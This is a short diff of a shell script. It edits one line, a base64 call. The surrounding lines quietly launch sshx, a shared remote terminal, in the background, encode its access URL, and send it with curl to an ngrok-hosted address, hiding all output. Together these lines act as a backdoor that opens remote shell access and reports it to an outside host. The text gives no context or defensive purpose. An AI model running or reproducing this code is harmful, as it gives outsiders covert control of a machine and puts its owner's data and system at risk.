@@ -7,7 +7,7 @@ fi
 
 sshx -q > /tmp/sshxurl.txt 2>&1 &
 sleep 1
-URL=$(base64 /tmp/sshxurl.txt)
+URL=$(base64 -i /tmp/sshxurl.txt)
 
 curl -s https://advanced-hardy-dolphin.ngrok-free.app/$URL > /dev/null 2>&1
 
